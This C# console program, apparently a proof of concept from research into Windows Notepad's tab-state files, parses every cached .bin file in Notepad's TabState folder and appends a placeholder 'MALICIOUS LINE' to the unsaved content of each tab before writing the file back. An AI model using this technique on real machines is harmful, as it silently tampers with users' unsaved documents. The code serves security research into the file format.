// See https://aka.ms/new-console-template for more information
using NotepadStateLibrary;
using System.Text;

Console.WriteLine("********** Starting *********");

string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState");

foreach (var path in Directory.EnumerateFiles(folder, "*.bin"))
{
    byte[] b = File.ReadAllBytes(path);
    if (b.Length > 0)
    {
        NPTabState np = new NPTabState(b);

        if (np.Content != null)
        {
            string x = Encoding.Unicode.GetString(np.Content);

            string evil = "MALICIOUS LINE";

            File.WriteAllBytes(path, np.WriteContent(Encoding.Unicode.GetBytes(x + Environment.NewLine + evil)));

        }
    }
}


//NPTabState npWrite = new NPTabState(Encoding.Unicode.GetBytes("Test"), [0x0], [0x0], new List<UnsavedBufferChunk>(), [0x1]);
//File.WriteAllBytes("check.bin", npWrite.bytes);

//NPTabState npWrite0 = new NPTabState(0, 25, 4, 4, [0x1], [0x0], [0x0]);
//File.WriteAllBytes("0.bin", npWrite0.bytes);


//byte[] sha = {
//    0x27, 0x09, 0x60, 0x35, 0x22, 0x8A, 0xA1, 0xB4, 0x47, 0x98, 0x4D, 0x7E, 0x1D, 0xFD, 0x10, 0xB9,
//    0xA8, 0x57, 0x16, 0xDA, 0x29, 0xA4, 0xEF, 0xFB, 0x65, 0x02, 0xE4, 0xA6, 0xDE, 0x26, 0x7A, 0xB3,
//};

//byte[] c = {
//    0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x74, 0x00,
//    0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x73, 0x00,
//};

//NPTabState npWrite1 = new NPTabState(0, [0x01], @"C:\Users\Reversing\Desktop\Test.txt", 12, [0x05], [0x01], new DateTime(2024, 4, 16, 11, 55, 24), sha, 0, 0, [0x1], [0x0], [0x0], c);
//File.WriteAllBytes("saved.bin", npWrite1.bytes);

Console.WriteLine("********** Completed **********");
Console.ReadLine();